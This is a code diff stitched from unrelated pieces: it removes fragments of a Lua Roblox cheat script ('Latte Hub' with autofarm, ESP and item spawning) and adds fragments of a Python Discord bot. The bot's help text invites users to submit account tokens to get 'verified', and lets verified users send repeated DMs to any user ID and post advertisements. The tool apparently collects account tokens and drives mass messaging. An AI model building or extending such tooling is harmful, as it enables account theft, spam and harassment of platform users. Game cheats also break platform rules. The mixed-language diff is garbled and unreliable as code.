+async def blacklist(ctx, user_id: str, action: str = "add"):
+    """Blacklist/unblacklist a user (admin only)"""
+    if not is_admin(ctx.author.id):
+        await ctx.send("❌ This command is only available to administrators.")
+        return
+    
+    try:
+        uid = int(user_id)
+        if action.lower() == "add":
+            blacklisted_users.add(uid)
+            if uid in verified_users:
+                verified_users.remove(uid)
+                save_verified_users()
+                statistics["total_verified_users"] = len(verified_users)
+                save_statistics()
+            save_blacklist()
+            await ctx.send(f"✅ User {user_id} has been blacklisted.")
+        elif action.lower() == "remove":
+            if uid in blacklisted_users:
+                blacklisted_users.remove(uid)
+                save_blacklist()
+                await ctx.send(f"✅ User {user_id} has been removed from blacklist.")
+            else:
+                await ctx.send(f"❌ User {user_id} is not blacklisted.")
+        else:
+            await ctx.send("❌ Action must be 'add' or 'remove'.")
+    except ValueError:
+        await ctx.send("❌ Invalid user ID format.")
 
--- Main Loop
-RunService.Heartbeat:Connect(function()
-    updateCharacter()
-    autoCollectLoop()
-    candyAutofarmLoop()
-    spawnXenoBundle()
-    spawnAlienbeam()
-end)
+@bot.command()
+async def commands(ctx):
+    """Display bot commands"""
+    embed = discord.Embed(title="🤖 Bot Commands", color=0x9b59b6)
+    
+    embed.add_field(
+        name="Public Commands",
+        value=(
+            "**!use <key>** - Authenticate with secret key\n"
+            "**!advertise <message>** - Post advertisement (requires auth)\n"
+            "**!add <token>** - Submit account token and get verified\n"
+            "**!send <user_id> <times> <message>** - Send DMs (verified only)\n"
+            "**!commands** - Show this command list"
+        ),
+        inline=False
+    )
+    
+    if is_admin(ctx.author.id):
+        embed.add_field(
+            name="Admin Commands",
+            value=(
+                "**!stats** - View bot statistics\n"
+                "**!listusers** - List verified users\n"
+                "**!removeuser <user_id>** - Remove user from verified list\n"
+                "**!blacklist <user_id> [add/remove]** - Manage blacklist"
+            ),
+            inline=False
+        )
+    
+    await ctx.send(embed=embed)
 
--- Initialize ESP
-updateESP()
-
--- Config setup
-local ConfigManager = Window.ConfigManager
-local ConfigName = "latte_config"
-Window.CurrentConfig = ConfigManager:CreateConfig(ConfigName)
-Window.CurrentConfig:Save()
-
-WindUI:Notify({
-    Title = "Latte Hub - WORKING Loaded!",
-    Content = "Welcome to the WORKING Halloween edition! All features ready!",
-    Time = 5
-})
+bot.run(TOKEN)
